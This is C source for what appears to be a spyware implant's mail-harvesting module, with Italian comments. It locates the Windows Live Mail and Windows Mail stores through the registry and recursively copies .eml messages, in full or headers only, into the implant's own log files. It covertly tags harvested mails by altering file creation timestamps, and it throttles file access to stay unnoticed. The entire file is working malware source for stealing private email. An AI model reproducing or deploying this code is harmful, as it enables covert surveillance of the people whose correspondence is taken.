/*********************************\
*                                 *
*   Microsoft Windows Live Mail   *
*   Microsoft Windows Mail 6.x    *
*                                 *
\*********************************/
// Multiple accounts support
// IMAP offline folders support
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <windows.h>
#include "../common.h"
#include "MailAgent.h"
#include "../LOG.h"

#define WLM_4GB 0xFFFFFFFF
#define WLM_MAIL_READ_FULL   0xDEAD
#define WLM_MAIL_READ_HEADER 0xCAFE
#define WLM_MAIL_UNREAD 0

#define UNREAD_MODULUS_PERCENTAGE 180000


BOOL WLM_MailDumpHeader(HANDLE source, DWORD mail_size, FILETIME *mail_date)
{
	BYTE *header_end;
	BYTE *read_buff;
	DWORD size = 0;
	HANDLE hf = INVALID_HANDLE_VALUE;
	struct MailSerializedMessageHeader additional_header;
	
	ZeroMemory(&additional_header, sizeof(additional_header));
	additional_header.Size = mail_size;
	additional_header.VersionFlags = MAPI_V2_0_PROTO;
	additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
	additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;

	// Siamo sicuri che anche leggendo il massimo sia sempre NULL terminato
	if ( (read_buff = (BYTE *)calloc(MAX_HEADER_SIZE+2, 1) ) == NULL )
		return FALSE;

	// Legge i primi K dell'header
	if (!FNC(ReadFile)(source, read_buff, MAX_HEADER_SIZE, &size, NULL) || size==0) {
		SAFE_FREE(read_buff);
		return FALSE;
	}

	// Se nello stream c'e' anche il body cerca di tagliarlo
	if (header_end = (BYTE *)strstr((char *)read_buff, "\r\n\r\n"))
		header_end[2]=0;

	// Scrive il log
	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
	if (hf == INVALID_HANDLE_VALUE) {
		SAFE_FREE(read_buff);
		return FALSE;
	}

	// L'header sara' comunque NULL terminato
	if (!Log_WriteFile(hf, read_buff, strlen((const char *)read_buff))) {
		Log_CloseFile(hf); 
		SAFE_FREE(read_buff);
		return FALSE;
	}

	Log_CloseFile(hf); 
	SAFE_FREE(read_buff);
	return TRUE;
}

// Dumpa l'intero contenuto della mail
BOOL WLM_MailDumpFull(HANDLE source, DWORD mail_size, FILETIME *mail_date)
{
	BYTE read_buff[2048];
	DWORD size = 0;
	HANDLE hf;
	struct MailSerializedMessageHeader additional_header;
	
	ZeroMemory(&additional_header, sizeof(additional_header));
	additional_header.Size = mail_size;
	additional_header.Flags |= MAIL_FULL_BODY;
	additional_header.VersionFlags = MAPI_V2_0_PROTO;
	additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
	additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;

	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
	if (hf == INVALID_HANDLE_VALUE)
		return FALSE;

	while (FNC(ReadFile)(source, read_buff, sizeof(read_buff), &size, NULL) && size>0) {
		if (!Log_WriteFile(hf, read_buff, size)) {
			Log_CloseFile(hf); 
			return FALSE;
		}
	}

	Log_CloseFile(hf); 
	return TRUE;
}

BOOL WLM_LogEmail(HANDLE fd, DWORD *mail_status, mail_filter_struct *mail_filter, FILETIME *mail_date)
{
	DWORD size = 0, fsh = 0;
	// Ricalcola qui la size per sicurezza
	size = FNC(GetFileSize)(fd, &fsh);
	if (fsh>0)
		size = WLM_4GB;

	// Cattura tutta la mail
	if (size <= mail_filter->max_size) {
		// check paranoico
		if (*mail_status == WLM_MAIL_READ_FULL)
			return FALSE;
		*mail_status = WLM_MAIL_READ_FULL;
		return WLM_MailDumpFull(fd, size, mail_date);
	} else { // Cattura solo l'header
		// check paranoico
		if (*mail_status != WLM_MAIL_UNREAD)
			return FALSE;
		*mail_status = WLM_MAIL_READ_HEADER;
		return WLM_MailDumpHeader(fd, size, mail_date);
	}

	return FALSE; // not reached
}

BOOL WLM_SetRead(HANDLE fd, DWORD mail_status)
{
	FILETIME creation_time;
	LARGE_INTEGER li;
	DWORD modulus;

	if (!FNC(GetFileTime)(fd, &creation_time, NULL, NULL))
		return FALSE;
	
	li.HighPart = creation_time.dwHighDateTime;
	li.LowPart = creation_time.dwLowDateTime;
	li.QuadPart /= 100000;
	modulus = li.QuadPart % UNREAD_MODULUS_PERCENTAGE;
	li.QuadPart -= modulus;
	li.QuadPart += mail_status;
	li.QuadPart *= 100000;
	creation_time.dwHighDateTime = li.HighPart;
	creation_time.dwLowDateTime = li.LowPart;

	if (!FNC(SetFileTime)(fd, &creation_time, NULL, NULL))
		return FALSE;
	return TRUE;
}

DWORD GetMailStatus(FILETIME *ft)
{
	LARGE_INTEGER li;
	DWORD status;

	li.HighPart = ft->dwHighDateTime;
	li.LowPart = ft->dwLowDateTime;
	li.QuadPart /= 100000;
	status = li.QuadPart % UNREAD_MODULUS_PERCENTAGE;

	// Verifica se la mail e' gia' stata letta (per intero o solo header)
	if ( status == WLM_MAIL_READ_FULL )
		return WLM_MAIL_READ_FULL;
	else if ( status == WLM_MAIL_READ_HEADER )
		return WLM_MAIL_READ_HEADER;
	else 
		return WLM_MAIL_UNREAD;
}

void FetchWindowsLiveMailMessages(const WCHAR *folder, mail_filter_struct *mail_filter)
{
	WCHAR buf[MAX_PATH];
	HANDLE findh = INVALID_HANDLE_VALUE, fd = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAW finddata;
	DWORD mail_size;
	DWORD mail_status;
	FILETIME mail_date;
	LARGE_INTEGER li;
	DWORD modulus;

	swprintf_s(buf, sizeof(buf)/sizeof(buf[0]), L"%s\\*.*", folder);
	if((findh = FNC(FindFirstFileW)(buf, &finddata)) == INVALID_HANDLE_VALUE) 
		return;
	do {
		if (g_bMailForceExit)
			break;

		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if(finddata.cFileName[0] == L'.') 
				continue;
			swprintf_s(buf, sizeof(buf)/sizeof(buf[0]), L"%s\\%s", folder, finddata.cFileName);
			FetchWindowsLiveMailMessages(buf, mail_filter);
			continue;
		}

		if(finddata.cFileName[0] == L'.' || !wcsicmp(finddata.cFileName, L"WLMailSearchSentinel.eml")) 
			continue;
		if(_wsplitpath_s(finddata.cFileName, NULL, 0, NULL, 0, NULL, 0, buf, sizeof(buf)/sizeof(buf[0])) || wcscmp(buf, L".eml")) 
			continue;

		swprintf_s(buf, sizeof(buf)/sizeof(buf[0]), L"%s\\%s", folder, finddata.cFileName);

		mail_status = GetMailStatus(&(finddata.ftCreationTime));

		// Calcola la dimensione della mail
		if (finddata.nFileSizeHigh != 0) 
			mail_size = WLM_4GB;
		else 
			mail_size = finddata.nFileSizeLow;

		// Verifica se il messaggio e' gia' stato letto
		if (mail_status == WLM_MAIL_READ_FULL || 
			(mail_status == WLM_MAIL_READ_HEADER && mail_size > mail_filter->max_size))
			continue;
		
		// Check sulla data (tolgo i bit usati per il filtro)
		li.HighPart = finddata.ftCreationTime.dwHighDateTime;
		li.LowPart = finddata.ftCreationTime.dwLowDateTime;
		li.QuadPart /= 100000;
		modulus = li.QuadPart % UNREAD_MODULUS_PERCENTAGE;
		li.QuadPart -= modulus;
		li.QuadPart *= 100000;
		mail_date.dwHighDateTime = li.HighPart;
		mail_date.dwLowDateTime = li.LowPart;

		if (!IsNewerDate(&mail_date, &(mail_filter->min_date)))
			continue;
		if (IsNewerDate(&mail_date, &(mail_filter->max_date)))
			continue;
		
		if((fd = FNC(CreateFileW)(buf, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) 
			continue;

		// XXX Per ora sono state eliminate le ricerche testuali
		//if (IsInterestingMail(fd, mail_filter) {
			if (WLM_LogEmail(fd, &mail_status, mail_filter, &mail_date))
				WLM_SetRead(fd, mail_status);
		//}
		Sleep(10); // Per non stendere la macchina sull'apertura dei file

		CloseHandle(fd);
	} while(FNC(FindNextFileW)(findh, &finddata));
	FNC(FindClose)(findh);

	return;
}


BOOL WLM_DumpEmails(mail_filter_struct *mail_filter)
{
	WCHAR *keycur, *keyarray[] = { L"Software\\Microsoft\\Windows Live Mail", L"Software\\Microsoft\\Windows Mail", NULL };
	WCHAR buf[MAX_PATH], storeroot[MAX_PATH];
	DWORD len, keycount;
	HKEY appkey = NULL;
	HANDLE findh = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATAW finddata;

	for(keycount = 0;(keycur = keyarray[keycount]); keycount++) {
		if (g_bMailForceExit)
			break;
		if(appkey) {
			FNC(RegCloseKey)(appkey);
			appkey = NULL;
		}

		if(FNC(RegOpenKeyExW)(HKEY_CURRENT_USER, keycur, 0, KEY_READ, &appkey) != ERROR_SUCCESS) 
			continue;
		len = sizeof(buf);
		if(FNC(RegQueryValueExW)(appkey, L"Store Root", NULL, NULL, (LPBYTE)buf, &len) != ERROR_SUCCESS) 
			continue;
		if(!FNC(ExpandEnvironmentStringsW)(buf, storeroot, sizeof(storeroot)/sizeof(storeroot[0]))) 
			continue;

		swprintf_s(buf, sizeof(buf)/sizeof(buf[0]), L"%s\\*.*", storeroot);
		if((findh = FNC(FindFirstFileW)(buf, &finddata)) == INVALID_HANDLE_VALUE) 
			continue;
		do {
			if (g_bMailForceExit)
				break;
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if(finddata.cFileName[0] == L'.') 
					continue;
				swprintf_s(buf, sizeof(buf)/sizeof(buf[0]), L"%s\\%s", storeroot, finddata.cFileName);
				FetchWindowsLiveMailMessages(buf, mail_filter);
			}
		} while(FNC(FindNextFileW)(findh, &finddata));
		FNC(FindClose)(findh);
	}

	if(appkey) {
		FNC(RegCloseKey)(appkey);
		appkey = NULL;
	}

	return TRUE;
}
